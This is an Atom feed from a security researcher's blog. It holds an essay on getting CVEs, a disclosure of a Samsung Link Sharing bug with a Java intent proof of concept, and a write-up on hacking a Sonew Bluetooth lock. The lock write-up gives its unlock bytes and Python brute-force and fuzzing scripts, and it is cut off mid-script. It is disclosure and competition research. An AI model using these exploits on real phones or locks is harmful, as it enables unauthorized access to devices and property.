<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-18T11:48:58-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">YayWebsiteYay (I suck at titles)</title><subtitle>Sometimes I want to publish stuff unfiltered.</subtitle><entry><title type="html">10 CVEs! My Personal Thoughts On Research And CVEs</title><link href="http://localhost:4000/research/2023/01/04/10-cves-my-personal-thoughts-on-research-and-cves.html" rel="alternate" type="text/html" title="10 CVEs! My Personal Thoughts On Research And CVEs" /><published>2023-01-04T10:00:00-05:00</published><updated>2023-01-04T10:00:00-05:00</updated><id>http://localhost:4000/research/2023/01/04/10-cves-my-personal-thoughts-on-research-and-cves</id><content type="html" xml:base="http://localhost:4000/research/2023/01/04/10-cves-my-personal-thoughts-on-research-and-cves.html">&lt;p&gt;Samsung issued their January 2023 patch, which included 2 more CVEs assigned to me. That makes 10 CVEs so far in my security career.&lt;/p&gt;

&lt;p&gt;A coworker told me I should do a talk talking about my CVEs, but I already publish the details of all of my CVEs. I like bragging too much to not publicly disclose &lt;em&gt;everything&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;So instead, I’ll use this platform to say some stuff that I think should be said. I often hear from people trying to get their first CVE, or trying to get into the security field, or just general research.&lt;/p&gt;

&lt;h2 id=&quot;how-and-why-i-research&quot;&gt;How And Why I Research&lt;/h2&gt;

&lt;p&gt;First, I should mention how I operate when it comes to doing security research:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;I do security research because it is fun and enjoy the chaos that comes with finding shit&lt;/li&gt;
  &lt;li&gt;I report my findings because I genuinely get concerned about what I find&lt;/li&gt;
  &lt;li&gt;I publicly disclose findings because I like bragging about what I’ve found&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I think the first bullet point is the one thing that needs to be said the loudest:&lt;/p&gt;

&lt;p&gt;I DO SECURITY RESEARCH BECAUSE IT IS FUN AND ENJOY THE CHAOS THAT COMES WITH FINDING SHIT&lt;/p&gt;

&lt;p&gt;It is this one thing that drives me to get certifications, open up COVID tests, and try again and again at Mobile Pwn2Own (I’m 0/3 attempts now lmao). I genuinely have fun doing what I do.&lt;/p&gt;

&lt;p&gt;And it comes with failures and dead ends. LOTS of dead ends. Last year for Pwn2own 2023, I looked at around 60 Android applications on the Samsung S22, and I only found 2 reportable issues in one single application. This happens. A LOT.&lt;/p&gt;

&lt;p&gt;But I look back at the fun I had doing it all, and guess what, I’ll be back at it again this year. And that’s what I think really needs to be drilled into the people “looking to do research”.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Research has to come from a place of fun and excitement. Otherwise it will be bad and shitty research. Its only when your heart is into the topic that you get good or usable output.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;my-thoughts-on-cves&quot;&gt;My Thoughts On CVEs&lt;/h2&gt;

&lt;p&gt;They’re awesome lmao. Don’t let anyone tell you otherwise.&lt;/p&gt;

&lt;p&gt;The coworker that asked me to do a talk also said that CVEs are like badges for security researchers.&lt;/p&gt;

&lt;p&gt;And they weren’t wrong. I’m literally writing a blog post because I got 10 badges to my name. Yeah there’s people with a LOT more badges. There’s a person at Project Zero who literally did a talk about “Here’s all the money Apple owes me because of how many CVEs I have from Apple specifically”. If I could find the talk, I would post it here, but I’m writing this in a single morning and I don’t feel like going through pages of Google to find the single talk.&lt;/p&gt;

&lt;p&gt;But back to my point on this, one thing I think gets lost in the talk about CVEs is that there are people out there who make it their “yearly goal” or something to get at least 1 CVE.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Literally all of my CVEs were given to me because I was doing what I enjoy. I’ve never tried to actively look for vulnerabilities that would give me a CVE.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;My first CVE, the Apple DoS bug (&lt;a href=&quot;/cves/cve-2018-4348.html&quot;&gt;https://yogehi.github.io/cves/cve-2018-4348.html&lt;/a&gt;), I was just randomly looking into macOS mechanics and behaviors with a co-worker. We both had the mindset “Dude macOS is kinda dumb. Let’s try to understand why its dumb.” We happened to stumble upon the issue during our “lets fuck around with macOS” journey, and we ended up repoting it to Apple because “why not?”.&lt;/p&gt;

&lt;p&gt;Apple comes back with a “here is a CVE for you” and both of us were excited. Our first CVE! OUR FIRST CVE! YEAH LETS GO OUT AND CELEBRATE! People go through their entire career without getting a CVE but we just got one! Yay!&lt;/p&gt;

&lt;p&gt;So what is my personal thought on all of this? What do I hope you, the reader, gets from all of this?&lt;/p&gt;

&lt;p&gt;&lt;em&gt;If you want a CVE, the best thing you can do is just look into stuff you find interesting and fun. Hey look, this goes back directly to the first part of this blog, where you should do research into stuff that you find fun and interesting.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;random-questions-and-random-answers&quot;&gt;Random Questions And Random Answers&lt;/h2&gt;

&lt;p&gt;I’m going to close this blog out with answering random questions I get about the security field and doing security research.&lt;/p&gt;

&lt;h3 id=&quot;how-do-i-get-started-into-security-research&quot;&gt;How do I get started into security research?&lt;/h3&gt;

&lt;p&gt;Just do it. The only thing stopping most people is their mental block of where they don’t know where to start. But the truth is that research has so many places to start, its better to just start in a random place and see where that takes you. And as you get more experienced with research, you’ll learn what is considered a “good” starting point, and what is considered a “bad starting point”.&lt;/p&gt;

&lt;h3 id=&quot;what-kind-of-software-or-equipment-should-i-use&quot;&gt;What kind of software or equipment should I use?&lt;/h3&gt;

&lt;p&gt;Everyone is different. Google what other people use and experiement with what you’re comfortable with.&lt;/p&gt;

&lt;p&gt;For me personally, when I do Android research:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An Android phone (lately its been either the S22 or Pixel 6a)&lt;/li&gt;
  &lt;li&gt;Drozer&lt;/li&gt;
  &lt;li&gt;Magisk&lt;/li&gt;
  &lt;li&gt;Android Studio&lt;/li&gt;
  &lt;li&gt;Jadx&lt;/li&gt;
  &lt;li&gt;ByteCode Viewer&lt;/li&gt;
  &lt;li&gt;Frida / Objection&lt;/li&gt;
  &lt;li&gt;XPosed / EdXposed / LSposed&lt;/li&gt;
  &lt;li&gt;Windows host OS with Python installed on the host OS&lt;/li&gt;
  &lt;li&gt;Ubuntu subsystem on the Windows host&lt;/li&gt;
  &lt;li&gt;BurpSuite&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;but-what-if-my-research-doesnt-get-any-good-vulnerabilities&quot;&gt;But what if my research doesn’t get any good vulnerabilities?&lt;/h3&gt;

&lt;p&gt;Then you’re looking at research from the wrong angle.&lt;/p&gt;

&lt;p&gt;Security research is you examining an object built by someone else. You’re there to better understand what the object does, how it was coded, and &lt;strong&gt;&lt;em&gt;IF&lt;/em&gt;&lt;/strong&gt; there are any security issues.&lt;/p&gt;

&lt;p&gt;Every time I finish a research project, I examine what I did right, what I did wrong, what kind of tooling I could make / have ready for the next project, and what new coding concepts I learned throughout the research. Vulnerabilities just happen to appear once in a while, but only after endless “dead ends” of secure code.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I think that’s everything I wanted to say in this blog post. And I also suck at ending blog posts.&lt;/p&gt;</content><author><name></name></author><category term="research" /><category term="random" /><summary type="html">Samsung issued their January 2023 patch, which included 2 more CVEs assigned to me. That makes 10 CVEs so far in my security career.</summary></entry><entry><title type="html">CVE-2022-24002 - Samsung Link Sharing Start Any Activity</title><link href="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html" rel="alternate" type="text/html" title="CVE-2022-24002 - Samsung Link Sharing Start Any Activity" /><published>2022-02-11T10:00:00-05:00</published><updated>2022-02-11T10:00:00-05:00</updated><id>http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity</id><content type="html" xml:base="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html">&lt;p&gt;In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Any exported activity&lt;/li&gt;
  &lt;li&gt;Any protected activity within the Link Sharing application&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I submitted this bug to Samsung but they said someone else already reported it. Today Samsung publicly disclosed the CVE ID for this issue, and credit goes to Dawuge of Pangu Team. I guess it is safe for me to disclose my PoC for it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Intent intent = new Intent();
intent.setComponent(new ComponentName(&quot;com.samsung.android.app.simplesharing&quot;, &quot;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&quot;));

Intent intent2 = new Intent();
intent2.setComponent(new ComponentName(&quot;com.sec.android.app.sbrowser&quot;, &quot;com.sec.android.app.sbrowser.SBrowserLauncherActivity&quot;)); // replace with any other target component
intent2.setData(Uri.parse(&quot;https://www.f-secure.com&quot;));
intent2.putExtra(&quot;yay&quot;, &quot;boo&quot;);

Bundle bundle = new Bundle();
bundle.putInt(&quot;extra_request_code&quot;, 9001);
bundle.putParcelable(&quot;extra_former_intent&quot;, intent2);

intent.putExtras(bundle);

startActivity(intent);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreConditionActivity&lt;/code&gt; is opened, the Intent is passed onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionViewModel.handlePrecondition(intent)&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public void onCreate(Bundle bundle) {
        AndroidInjection.inject(this);
        ...
        PreconditionViewModel viewModel = getViewModel();
        ...
        viewModel.handlePrecondition(intent);
    }

    public final PreconditionViewModel getViewModel() {
        return (PreconditionViewModel) this.viewModel$delegate.getValue();
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The Intent is processed, and the parcelable extra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extra_former_intent&lt;/code&gt; is stored in the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt;. This variable can then be called via the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionViewModel extends AndroidViewModel {

    private Intent formerIntent;

    public final void handlePrecondition(Intent intent) {
        if (!this.isInit) {
            this.isInit = true;
            if (isFromSdk(intent)) {
                this.callerType = CallerType.TYPE_SDK;
                if (enforceShowPermissionNotice()) {
                    setShouldEnforceShowPermissionNotice();
                } else {
                    setShouldRequestPermission();
                }
            } else if (isOptionalContactRequest(intent)) {
                setShouldRequestContactPermission();
            } else if (isOptionalCameraRequest(intent)) {
                setShouldRequestCameraPermission();
            } else {
                Intent intent2 = (Intent) intent.getParcelableExtra(&quot;extra_former_intent&quot;);
                this.formerIntent = intent2;
                ...
    }

    public final Intent getFormerIntent() {
        return this.formerIntent;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Going back to the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&lt;/code&gt;, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startFormalIntentActivity()&lt;/code&gt; is called which then retrieves the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;, and then calls class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.common.util.NavigatorUtil&lt;/code&gt; method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivityFromFormerIntent(Activity, Intent)&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public final void startFormalIntentActivity() {
        if (getViewModel().isProcessRestart()) {
            NavigatorUtil.startHistoryActivity$default(NavigatorUtil.INSTANCE, this, false, null, 6, null);
        } else {
            Intent formerIntent = getViewModel().getFormerIntent();
            if (formerIntent != null) {
                NavigatorUtil.INSTANCE.startActivityFromFormerIntent(this, formerIntent);
            }
        }
        finishWithSuccess();
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is finally passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity(Activity, Intent)&lt;/code&gt;, where the component in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is used to start a new activity:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.common.util;

public final class NavigatorUtil {

    public final void startActivityFromFormerIntent(Activity activity, Intent intent) {
        Intent copyIntent = copyIntent(intent);
        if (intent.getClipData() != null) {
            copyIntent.setClipData(intent.getClipData());
            copyIntent.addFlags(1);
        }
        INSTANCE.startActivity(activity, copyIntent);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="research" /><category term="bug" /><category term="collision" /><summary type="html">In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:</summary></entry><entry><title type="html">Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”</title><link href="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" rel="alternate" type="text/html" title="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" /><published>2021-12-31T10:00:00-05:00</published><updated>2021-12-31T10:00:00-05:00</updated><id>http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own</id><content type="html" xml:base="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html">&lt;p&gt;In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image1.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth.&lt;/p&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;

&lt;p&gt;Inside the lock:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image2.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image3.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some features of the lock:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Communicated over Bluetooth with a physical 4 directional button unlock option&lt;/li&gt;
  &lt;li&gt;If you use Bluetooth, you need to know the lock’s 6 digit passcode&lt;/li&gt;
  &lt;li&gt;The phone can store this passcode for easy access&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered.&lt;/p&gt;

&lt;h1 id=&quot;unlock-the-lock&quot;&gt;Unlock the lock&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;lock-the-lock&quot;&gt;Lock the lock&lt;/h1&gt;

&lt;p&gt;THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;send-passcode&quot;&gt;Send passcode&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the passcode was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x59 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;change-passcode&quot;&gt;Change passcode&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the old passcode was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x58 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;change-4-directional-button-code&quot;&gt;Change 4 directional button code&lt;/h1&gt;

&lt;p&gt;The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the old button code was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x60 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;brute-force-option&quot;&gt;Brute Force Option&lt;/h2&gt;

&lt;p&gt;The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def guess_password_method(i):
    password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28])
    open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD])
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        password_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    #if i % 100 == 0:
    #    print(&apos;sending 0xff 0x00 0xff&apos;)
    #    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF]))
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code)
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code)
    yay = padding + &quot; &quot; + code
    return yay


def handle_data(handle, value):
    response = hexlify(value)
    if &quot;59f00095&quot; in str(response):
        print(&quot;Received &apos;guess password success&apos; repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def change_physical_method(i):
    # ff xx xx xx xx xx xx yy yy yy yy yy yy fe
    physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot;
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] &amp;gt; 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False)
    print(padding + &quot; &quot; + code)

def handle_data(handle, value):
    response = hexlify(value)
    # 60 f0 00 95
    if &quot;60f00095&quot; in str(response):
        print(&quot;Received repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition.&lt;/p&gt;

&lt;h2 id=&quot;hidden-command&quot;&gt;Hidden Command&lt;/h2&gt;

&lt;p&gt;At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with &lt;em&gt;something&lt;/em&gt; if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xXX - beginning byte
    |__0xYY 0xYY 0xYY 0xYY - some data
                         |__0xZZ - end byte
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example, sending the real OPEN command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD&lt;/code&gt; would result in the lock responding with some bytes, but sending a different payload, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE&lt;/code&gt; would result in the lock not sending any data back.&lt;/p&gt;

&lt;p&gt;Additionally, the middle data must be the correct length. For example, sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD&lt;/code&gt; is a valid command, but sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD&lt;/code&gt; is not a valid command.&lt;/p&gt;

&lt;p&gt;The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1 byte at the beginning&lt;/li&gt;
  &lt;li&gt;Anywhere between 1 and 18 bytes for the middle data&lt;/li&gt;
  &lt;li&gt;1 byte at the end&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So lets make a script which will attempt to find additional commands within the above parameters:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pygatt
from binascii import hexlify
import sys
import math
from concurrent import futures
import random
import time

adapter = pygatt.backends.GATTToolBackend(&apos;hci0&apos;)

def handle_data(handle, value):
    response = hexlify(value)
    print(&quot;Received repsonse (%s)&quot; % str(response))

def decimal_to_hexadecimal(dec): 
    decimal = int(dec) 
    return hex(decimal)

def fuzz_function(payload1, payload2, paddingCounter):
  #create temp code
  temp_code_length = paddingCounter + 2
  temp_code_array = bytearray(temp_code_length)
  #create byte array payload
  temp_code_array[0] = payload1
  temp_code_array[temp_code_length - 1] = payload2
  #temp_code_array[temp_code_length]
  print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2))
  device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array)

adapter.start()
device = adapter.connect(&apos;28:EC:9A:09:C7:2B&apos;)

device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False)
device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True)

payload1 = 0
paddingCounter = 1

# modify payload 2
payload2 = 0

while payload2 != 256:
  while paddingCounter != 19:
    fuzz_function(payload1, payload2, paddingCounter)
    paddingCounter = paddingCounter + 1
  paddingCounter = 1
  payload2 = payload2 + 1

adapter.stop()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect.&lt;/p&gt;

&lt;p&gt;Thankfully some hidden commands were found:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xEF 0xXX 0xXX 0xXX 0xXX 0xF1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFD 0xXX 0xXX 0xXX 0xXX 0xFC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def guess_physical_method(i):
    physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot;
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
